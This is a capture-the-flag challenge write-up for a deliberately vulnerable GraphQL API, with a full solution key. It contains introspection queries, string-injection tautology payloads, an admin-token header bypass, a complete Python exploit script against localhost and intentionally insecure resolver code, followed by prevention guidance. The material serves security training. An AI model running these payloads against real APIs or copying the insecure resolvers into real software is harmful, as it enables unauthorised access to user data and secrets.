# Papa - GraphQL Injection Challenge

**Status:** ✅ Complete

## Player Description

Welcome to the EverSec GraphQL API - the future of APIs! We enabled introspection so developers can explore our schema easily (we're so thoughtful!). Some senior developers said to "disable introspection in production" but we think that's just gatekeeping knowledge. Our GraphQL resolvers directly use user input because GraphQL is modern and safe - not like those old SQL databases with their "injection" problems. We also skip authorization checks on some queries because if we hired you, we trust you! It's called company culture. Besides, the secrets query is clearly labeled "secrets" so obviously only admins would query it. We use the honor system!

## Technical Description

**Category:** Web Security / API
**Difficulty:** Hard
**Points:** 1500 (400 + 500 + 600)
**Port:** 4012

EverSec's new GraphQL API provides powerful data querying capabilities. But with great power comes great responsibility... and great vulnerabilities.

Can you exploit GraphQL-specific vulnerabilities to extract sensitive data?

## Learning Objectives

- Understanding GraphQL introspection and schema discovery
- Exploiting GraphQL injection vulnerabilities
- Bypassing authorization with GraphQL queries
- Learning about batch query attacks
- Understanding GraphQL security best practices

## Flags

- **FLAG 1** (400 points): Use introspection to discover the GraphQL schema
- **FLAG 2** (500 points): Exploit GraphQL injection to access admin data
- **FLAG 3** (600 points): Extract secrets using unauthorized queries

## Setup Instructions

### Using Docker Compose (Recommended)

```bash
docker compose up -d papa-graphql-injection
docker compose logs -f papa-graphql-injection
docker compose down papa-graphql-injection
```

### Local Development

```bash
cd Challenges/papa-graphql-injection
pip install -r requirements.txt
python app.py
```

Access at: http://localhost:4012

## Solution

### FLAG 1: GraphQL Introspection

GraphQL introspection allows querying the schema itself. When you request field descriptions, the `systemFlag` field carries FLAG 1 in its `description` field:

```graphql
query {
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

Look for the `systemFlag` entry in the response — its `description` value is FLAG 1.

**Alternative: query systemFlag directly**

```graphql
query {
  systemFlag
}
```

**FLAG 1 is in the `description` field of `systemFlag` in the introspection response.**

### FLAG 2: GraphQL Injection

The `userByUsername` resolver simulates a SQL `WHERE username='<INPUT>'` clause using string concatenation. When injection causes the clause to match multiple users, the admin user is returned with a bonus `secret` field containing FLAG 2.

```graphql
query {
  userByUsername(username: "x' OR '1'='1") {
    id
    username
    email
    role
    bio
    secret
  }
}
```

**FLAG 2 is in the `secret` field of the returned admin user** — it only appears when the injection tautology succeeds (matching more than one user).

**Working injection payloads:**
- `x' OR '1'='1` (single-quote tautology)
- `x' OR 'a'='a` (alternative tautology)
- `" OR "1"="1` (double-quote via GET)
- Any payload that creates a valid boolean tautology when inserted into `WHERE username='<INPUT>'`

Note: a direct lookup like `username: "admin"` returns the admin user without the `secret` field — injection is required.

### FLAG 3: Secrets Extraction (Requires Admin Token)

The `secrets` query requires an `X-Admin-Token` header. Without it, the response omits the entry containing FLAG 3.

**Step 1: Find the admin token**

From the FLAG 2 injection result you have admin access. The SECRETS list contains an entry named `API Key` with value `sk_live_abc123def456`. This is the token you need.

**Step 2: Access secrets with the token**

```graphql
query {
  secrets {
    id
    name
    value
  }
}
```

Send this query with the HTTP header:

```
X-Admin-Token: sk_live_abc123def456
```

```bash
curl -X POST http://localhost:4012/graphql \
  -H "Content-Type: application/json" \
  -H "X-Admin-Token: sk_live_abc123def456" \
  -d '{"query": "{ secrets { id name value } }"}'
```

FLAG 3 is in the `value` field of the `Encryption Key` secret entry.

**Bonus: Batch Queries with Aliases**

```graphql
query {
  secret1: secrets {
    id
    name
    value
  }
  secret2: secrets {
    value
  }
}
```

## Complete Exploit Script

```python
#!/usr/bin/env python3
import urllib.request
import json

TARGET = "http://localhost:4012/graphql"

def graphql_query(query, headers=None):
    """Execute GraphQL query with optional extra headers"""
    data = json.dumps({"query": query}).encode('utf-8')
    req = urllib.request.Request(TARGET, data=data,
                                  headers={'Content-Type': 'application/json'})
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    with urllib.request.urlopen(req) as response:
        return json.loads(response.read().decode())

# FLAG 1: Introspection — FLAG is in the description of systemFlag
print("[*] FLAG 1: Introspection")
introspection_query = """
query {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
"""
result = graphql_query(introspection_query)
for field in result['data']['__schema']['queryType']['fields']:
    if field['name'] == 'systemFlag' and field.get('description'):
        print(f"[+] FLAG 1: {field['description']}")

# FLAG 2: Injection — FLAG is in the secret field of admin (only on injection)
print("\n[*] FLAG 2: GraphQL Injection")
injection_query = """
query {
  userByUsername(username: "x' OR '1'='1") {
    id
    username
    bio
    secret
  }
}
"""
result = graphql_query(injection_query)
user = result['data']['userByUsername']
if user and user.get('secret'):
    print(f"[+] FLAG 2 (secret field): {user['secret']}")
else:
    print(f"Admin user data: {user}")

# FLAG 3: Secrets with admin token — token found in secrets list
# First, access secrets without token to find API key (returned for non-FLAG3 entries)
print("\n[*] FLAG 3: Secrets with Admin Token")
secrets_query = "{ secrets { id name value } }"

# Step 1: Get partial secrets (API key is in there, FLAG3 entry is excluded)
result = graphql_query(secrets_query)
admin_token = None
for secret in result['data']['secrets']:
    if secret['name'] == 'API Key':
        admin_token = secret['value']
        print(f"[+] Found admin token: {admin_token}")

# Step 2: Use token to get full secrets including FLAG3
if admin_token:
    result = graphql_query(secrets_query, headers={'X-Admin-Token': admin_token})
    for secret in result['data']['secrets']:
        if secret['name'] == 'Encryption Key':
            print(f"[+] FLAG 3: {secret['value']}")
```

## Vulnerabilities

### 1. Introspection Enabled

```python
# Should be disabled in production
if '__schema' in query:
    return schema_data  # VULNERABLE
```

### 2. String Injection in Resolvers

```python
def resolve_user_by_username(args):
    username = args.get('username', '')
    # Simulates: WHERE username = '{username}'
    # Injection breaks out of quotes and adds tautology
    simulated_where = f"username='{username}'"
    # Evaluates the condition against all users
    for user in USERS:
        if _evaluate_condition(simulated_where, user):
            return user  # VULNERABLE
```

### 3. Missing Authorization

```python
def resolve_secrets():
    # VULNERABLE: No authorization check
    return SECRETS
```

### 4. Query Depth Limiting

Queries with nesting depth > 8 are rejected with HTTP 400. Batch alias abuse and normal exploit queries are unaffected — only pathologically deep (9+ level) nesting is blocked.

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

GraphQL APIs can describe their own schema through a feature called introspection. Is it enabled here? What does it tell you about available queries, mutations, and their fields?

</details>

<details>
<summary>Hint 2</summary>

One query takes a username as input. SQL injection uses tautologies like `x' OR '1'='1` to match all rows — does a similar logical manipulation work here when the backend uses SQL-like comparison logic?

</details>

<details>
<summary>Hint 3</summary>

Introspection reveals every available query. Do any of them seem to lack authorization checks? What would happen if you simply called them without the expected credentials?

</details>

<details>
<summary>Hint 4</summary>

GraphQL supports write operations (mutations) in addition to queries. What mutations does introspection reveal, and could any of them do something powerful?

</details>

## Prevention

### 1. Disable Introspection in Production

```python
from graphql import GraphQLSchema

schema = GraphQLSchema(
    query=query_type,
    mutation=mutation_type,
    enable_introspection=False  # Disable in prod
)
```

### 2. Use Parameterized Queries

```python
# Good
def resolve_user_by_username(username):
    return User.objects.get(username=username)  # Parameterized

# Bad
def resolve_user_by_username(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"  # Injectable
```

### 3. Implement Authorization

```python
def resolve_secrets(info):
    user = info.context.user
    if not user or user.role != 'admin':
        raise GraphQLError("Unauthorized")
    return Secret.objects.all()
```

### 4. Add Query Complexity Limits

```python
from graphql import GraphQLSchema

schema = GraphQLSchema(
    query=query_type,
    max_depth=5,  # Limit nesting
    max_complexity=1000  # Limit query cost
)
```

### 5. Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/graphql', methods=['POST'])
@limiter.limit("100 per minute")
def graphql_endpoint():
    # ... query execution
```

## References

- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Introspection](https://graphql.org/learn/introspection/)
- [HowToGraphQL Security](https://www.howtographql.com/advanced/4-security/)

## Author Notes

GraphQL's flexibility makes it powerful but also introduces unique security challenges:

- **Introspection** exposes the entire schema
- **Deep nesting** can cause DoS
- **Batch queries** amplify attacks
- **Injection** works differently than SQL
- **Authorization** must be per-field, not per-endpoint

Key insight: GraphQL shifts security from endpoint-level to field-level. Every resolver needs authorization checks.
